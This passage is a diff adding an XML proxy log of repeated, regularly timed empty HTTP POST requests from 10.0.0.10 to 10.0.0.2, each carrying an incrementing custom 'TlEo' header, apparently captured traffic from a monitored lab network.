+  <ConnectIndex>69</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:26'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49360</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:29'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:29'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49361</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:29'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000046
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000046</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:29'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49361</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>70</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:29'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49361</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:31'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49362</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:31'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000047
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000047</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49362</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>71</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:31'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49362</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:34'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49363</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:34'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000048
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000048</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49363</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>72</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:34'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49363</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:37'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49364</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:37'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000049
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000049</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49364</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>73</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:37'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49364</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:40'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49365</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:40'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000004a
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000004a</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49365</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>74</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:40'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49365</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:43'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49366</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:43'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000004b
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000004b</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49366</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>75</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:43'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49366</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:46'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:46'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49367</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:46'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000004c
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000004c</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:46'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49367</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>76</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:46'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49367</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:49'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:49'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49368</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:49'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000004d
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000004d</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:49'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49368</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>77</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:49'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49368</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:51'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49369</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:51'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000004e
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000004e</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49369</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>78</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:51'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49369</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:54'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49370</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:54'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:0000004f
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>0000004f</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49370</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>79</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:54'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49370</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:44:57'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:44:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49371</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:44:57'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000050
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000050</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:44:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49371</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>80</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:44:57'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49371</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:00'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49372</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:00'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000051
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000051</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49372</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>81</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:00'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49372</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:03'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49373</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:03'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000052
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000052</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49373</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>82</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:03'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49373</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:06'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49374</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:06'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000053
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000053</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49374</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>83</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:06'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49374</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:09'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49375</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:09'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000054
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000054</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49375</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>84</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:09'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49375</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:12'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:12'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49376</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:12'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000055
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000055</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:12'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49376</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>85</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:12'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49376</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:15'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:15'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49377</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:15'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000056
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000056</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:15'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49377</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>86</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:15'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49377</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:17'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49378</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:17'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000057
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000057</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
+</PCProxy_HttpHeader>
+<PCProxy_ConnectionReceived lptimestamp='2017-10-16T09:45:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49378</Port>
+  </Target>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+  <Id>0x01f835a8e59a2bc9</Id>
+  <ConnectIndex>87</ConnectIndex>
+</PCProxy_ConnectionReceived>
+<PCProxyConnection_Activity lptimestamp='2017-10-16T09:45:17'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49378</Port>
+  </Target>
+  <Id>0x00000f98e59a2bc9</Id>
+</PCProxyConnection_Activity>
+<PCProxy_Activity lptimestamp='2017-10-16T09:45:20'>
+  <Local>
+    <Address>0.0.0.0</Address>
+    <Port>80</Port>
+  </Local>
+</PCProxy_Activity>
+<PCProxy_ValidConnection lptimestamp='2017-10-16T09:45:20'>
+  <Target>
+    <Address>10.0.0.10</Address>
+    <Port>49379</Port>
+  </Target>
+</PCProxy_ValidConnection>
+<PCProxy_HttpHeader lptimestamp='2017-10-16T09:45:20'>
+  <HttpHeader>POST / HTTP/1.1
+Referrer: http://10.0.0.2/
+TlEo: 0e59a2bc9:00000058
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)
+Host: 10.0.0.2
+Content-Length: 0
+Connection: Keep-Alive
+Cache-Control: no-cache
+
+</HttpHeader>
+  <BytesRead>212</BytesRead>
+  <HeaderLength>212</HeaderLength>
+  <ConnectIndex>00000058</ConnectIndex>
+  <Id>0x04f5fdf8e59a2bc9</Id>
